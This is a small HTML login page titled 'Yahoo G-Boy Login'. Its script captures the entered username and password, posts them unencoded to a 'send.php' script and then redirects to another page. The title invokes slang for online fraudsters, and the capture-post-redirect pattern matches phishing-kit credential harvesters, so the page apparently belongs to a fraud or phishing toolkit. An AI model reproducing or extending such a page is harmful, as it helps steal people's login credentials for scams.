<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Yahoo G-Boy Login ðŸ”¥</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
<h2>Yahoo G-Boy Login ðŸ”¥</h2>
<form id="loginForm">
    Username: <input type="text" id="username" placeholder="Username" required><br>
    Password: <input type="password" id="password" placeholder="Password" required><br>
    <button type="submit">Login</button>
</form>

<script>
document.getElementById("loginForm").onsubmit = function(e) {
    e.preventDefault();

    let username = document.getElementById("username").value;
    let password = document.getElementById("password").value;

    fetch("send.php", {
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        body: `username=${username}&password=${password}`
    }).then(response => {
        window.location.href = "index.html";
    });
}
</script>
</body>
</html>
